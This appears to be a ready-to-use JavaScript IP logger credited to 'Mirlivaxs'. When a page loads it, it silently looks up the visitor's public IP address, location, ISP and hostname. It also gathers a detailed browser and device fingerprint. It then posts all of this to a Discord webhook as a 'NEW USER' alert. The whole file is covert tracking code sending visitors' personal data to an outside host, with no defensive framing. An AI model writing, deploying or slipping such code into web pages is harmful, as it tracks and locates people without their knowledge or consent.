fetch("https://wtfismyip.com/json")
.then((response) => response.json())
.then((data) => {
let cumalog = {
Header: "**INFO:** ", 
IP: "\n```IPAddress: "  + data.YourFuckingIPAddress ,
Location: "\nLocation: "  + data.YourFuckingLocation ,
Hostname: "\nHostname: "  + data.YourFuckingHostname,
ISP: "\nISP: "  + data.YourFuckingISP,
City: "\nCity: "  + data.YourFuckingCity,
country: "\nCountry: "  + data.YourFuckingCountry,
countryCode: "\nCountry Code: "  + data.YourFuckingCountryCode,
userAgent: "\nUser-agent: "  + navigator.userAgent,
windowProp: "\nWindow Properties: "  + Object.keys(window).length,
windowWidth: "\nWindow Width: "  + window.innerWidth,
windowHeight: "\nWindow Height: "  + window.innerHeight,
windowRatio: "\nWindow Ratio: "  + window.innerWidth / window.innerHeight,
screenWidth: "\nScreen Width: "  + window.screen.availWidth,
screenHeight: "\nScreen Height: "  + window.screen.availHeight,
screenRatio: "\nScreen Ratio: "  + window.screen.availWidth / window.screen.availHeight,
DPI: "\nDPI "  + window.devicePixelRatio,
colorDepth: "\nColor Depth: "  + window.screen.colorDepth,
orientation: "\nOrientation: "  + window.screen.orientation.type,
orientationAngle: "\nOrientation Angle: "  + window.screen.orientation.angle,
os: "\nOs: "   + navigator.platform,
threads: "\nThreads: "  + navigator.hardwareConcurrency,
memory: "\nMemory: "  + navigator.deviceMemory,
systemLanguages: "\nSystem Language: "   + navigator.languages.join(", "),
Languages: "\nLanguage: "  + navigator.language + "```" ,





};
 
const response = {
"embeds": [
{
"color": "921",
"title": "NEW USER :eyes:",
"description": (cumalog.Header) + (cumalog.IP) + (cumalog.Location) + (cumalog.country) + (cumalog.City) + (cumalog.Hostname) + (cumalog.ISP) + (cumalog.countryCode) + (cumalog.userAgent) + (cumalog.windowProp) + (cumalog.windowRatio) + (cumalog.windowWidth) + (cumalog.windowHeight) + (cumalog.screenRatio) + (cumalog.screenWidth) + (cumalog.screenHeight) + (cumalog.DPI) + (cumalog.colorDepth) + (cumalog.orientationAngle) + (cumalog.orientation) + (cumalog.os) + (cumalog.threads) + (cumalog.memory) + (cumalog.systemLanguages) + (cumalog.Languages),
"author": { 
"name": "Mırlıvaxs",
"url": "https://github.com/mirlivaxs",
"icon_url": "https://media.discordapp.net/attachments/1069766003518619780/1103083480906211399/kkk.gif.gif"
},
"footer": {
"text": "made by Mirlivaxs",
"icon_url": "https://media.discordapp.net/attachments/1069766003518619780/1103083480906211399/kkk.gif.gif"
}
}
]
};

fetch("WEBHOOK HERE", {
method: "POST",
headers: {
"Content-Type": "application/json",
},
body: JSON.stringify(response),
})	
.then((response) => console.log(response))
.catch((error) => console.error(error));
})
.catch((error) => console.error(error));